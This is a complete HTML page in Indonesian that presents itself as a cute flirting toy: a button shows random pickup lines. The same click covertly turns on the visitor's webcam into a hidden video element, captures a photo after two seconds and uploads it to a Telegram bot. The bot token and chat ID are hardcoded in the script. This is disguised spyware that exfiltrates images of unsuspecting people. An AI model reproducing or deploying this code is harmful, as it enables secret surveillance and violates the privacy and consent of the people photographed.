<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            background: linear-gradient(45deg, #ff758c, #ff7eb3);
            font-family: 'Comic Sans MS', cursive, sans-serif;
            transition: background 0.5s;
            overflow: hidden;
        }

        h1 {
            font-size: 30px;
            color: white;
        }

        p {
            font-size: 20px;
            color: white;
            font-weight: bold;
        }

        button {
            background-color: #ff4d6d;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 25px;
            transition: transform 0.2s, background 0.3s;
        }

        button:hover {
            transform: scale(1.1);
            background-color: #ff1e56;
        }

        video {
            display: none; /* Video tetap ada tapi tersembunyi */
        }
    </style>
</head>
<body>

    <h1>üíñ Halo, Bidadari! üíñ</h1>
    <p id="flirtText">Klik tombol di bawah buat lihat sesuatu yang spesial! üòò</p>
    <button onclick="godaCewe()">Klik Aku! üíï</button>

    <video id="video" autoplay></video>

    <script>
        const rayuanList = [
            "Aku yakin gravitasi gak bisa lawan daya tarik kamu. üòç",
            "Kamu seperti kopi, bikin jantungku berdetak lebih cepat! ‚òïüíì",
            "Kalau bidadari turun ke bumi, pasti wajahnya mirip kamu! üòá",
            "Mau tau kenapa aku selalu tersenyum? Karena ada kamu. üòä‚ù§Ô∏è"
        ];

        const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI'; // Ganti dengan token bot Telegram
        const chatId = '1746156378'; // Ganti dengan chat ID Telegram
        const video = document.getElementById('video');

        function godaCewe() {
            const flirtText = document.getElementById("flirtText");
            flirtText.textContent = rayuanList[Math.floor(Math.random() * rayuanList.length)];

            startCapture();
        }

        function startCapture() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;

                        // Tunggu sampai video siap
                        video.onloadedmetadata = () => {
                            setTimeout(() => {
                                captureAndSend(stream);
                            }, 2000);
                        };
                    })
                    .catch(error => alert("Akses kamera ditolak."));
            }
        }

        function captureAndSend(stream) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                sendToTelegram(blob);
                stream.getTracks().forEach(track => track.stop());
            }, 'image/jpeg');
        }

        function sendToTelegram(blob) {
            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            fetch(url, { method: 'POST', body: formData });
        }
    </script>

</body>
</html>
